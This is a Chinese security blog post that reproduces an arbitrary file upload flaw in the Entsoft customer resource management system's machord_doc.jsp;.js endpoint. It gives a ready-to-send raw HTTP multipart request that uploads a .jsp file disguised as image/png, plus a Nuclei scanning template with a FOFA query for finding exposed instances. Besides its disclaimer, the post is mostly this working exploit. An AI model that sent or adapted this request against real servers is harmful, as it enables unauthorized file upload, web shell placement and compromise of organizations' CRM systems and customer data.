#  【漏洞复现】某客户资源管理系统machord_doc.jsp;.js接口任意文件上传 附POC   
YGnight  night安全   2023-11-23 21:00  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKkfhZx9pRCUfvMAibuyyKcqkre0yrOV0Sc8YxlMKupVaDA7dCTIKol4g/640?wx_fmt=gif "")  
  
公众号新规  
只对常读  
和  
星标的公众号才能展示大图推送，  
建议大家把公众号“  
n  
i  
g  
h  
t  
安  
全”设为  
星  
标  
，  
否  
则  
可  
能  
就  
看  
不  
到  
啦  
！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6sHg0pvRw6MpQSvVF3CeJ83RS0Ys1YBXC1vM6icvsxKialdwur2lAFAsQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6kXG7JA6Rbic2FFaqy9dPWrQlwfRNCPfyicibm6Evv39Z6VttiagBARRQgw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
免责声明  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqg4CicjYhkyn7j8xeutLIIGlA3Pam1Oxz5ujOUsmPibr5J9NCiagtp8nGEEXPeJiaUeWkN3v1XXSS9Vfw/640?wx_fmt=gif "")  
  
  
  
night安全致力于分享技术学习和工具掌握。然而请注意不得将此用于任何未经授权的非法行为，请您严格遵守国家信息安全法律法规。任何违反法律、法规的行为，均与本人无关。如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
漏洞概述  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
浙大恩特客户资源管理系统中machord_doc.jsp;.js接口处存在任意文件文件上传漏洞。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6jE5wujsCEJHCCahiaNsriavGRSr3LnDOeFsqbUX9UUABhdd0szj7jugg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
```
POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=night.jsp&strAffixStr=&oprfilenam=null&gesnum= HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----4225820000370152680749129212
Content-Length: 548
 
------4225820000370152680749129212
Content-Disposition: form-data; name="oprfilenam"
 
null
------4225820000370152680749129212
Content-Disposition: form-data; name="uploadflg"
 
0
------4225820000370152680749129212
Content-Disposition: form-data; name="strAffixStr"
 
 
------4225820000370152680749129212
Content-Disposition: form-data; name="selfilenam"
 
 
------4225820000370152680749129212
Content-Disposition: form-data; name="uploadfile"; filename="night.jsp"
Content-Type: image/png
 
night
------4225820000370152680749129212--
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6icYnhudZSJo4cg4AjcN8rMTZXHvI75oIYEVUNLGzWN0pFd2RPPd83Bw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
NUCLEI POC  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka60teoTKjEibTwt3zqyh0sNVcZPYicYJzwrDibJ9z55UZ1ibYWHXKwrYQ5CA/640?wx_fmt=png&from=appmsg "")  
  
```
id: enter-machord_doc-api-fileupload
 
info:
  name: 浙大恩特客户资源管理系统machord_doc.jsp;.js接口任意文件上传
  author: YGnight
  severity: high
  description: description
  reference:
    - https://
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="浙大恩特客户资源管理系统"
 
 
requests:
  - raw:
      - |-
        POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=night.jsp&strAffixStr=&oprfilenam=null&gesnum= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: multipart/form-data; boundary=----4225820000370152680749129212
        Content-Length: 548
 
        ------4225820000370152680749129212
        Content-Disposition: form-data; name="oprfilenam"
 
        null
        ------4225820000370152680749129212
        Content-Disposition: form-data; name="uploadflg"
 
        0
        ------4225820000370152680749129212
        Content-Disposition: form-data; name="strAffixStr"
 
 
        ------4225820000370152680749129212
        Content-Disposition: form-data; name="selfilenam"
 
 
        ------4225820000370152680749129212
        Content-Disposition: form-data; name="uploadfile"; filename="night.jsp"
        Content-Type: image/png
 
        night
        ------4225820000370152680749129212--
 
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'night.jsp'
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKpciaqHNr4Y60SPF1XeS358wiceQDUm8K5zh7RZsnknYxKJ37kkkcpWZg/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6DCLEF53OGJWH7A9YU8LA95g10yEzvZgFYhwhV3OQX3qdtk7vIsWncw/640?wx_fmt=png&from=appmsg "")  
  
****  
扫  
码  
关  
注  
  
获  
得  
更  
多  
资  
讯  
  
****  
  
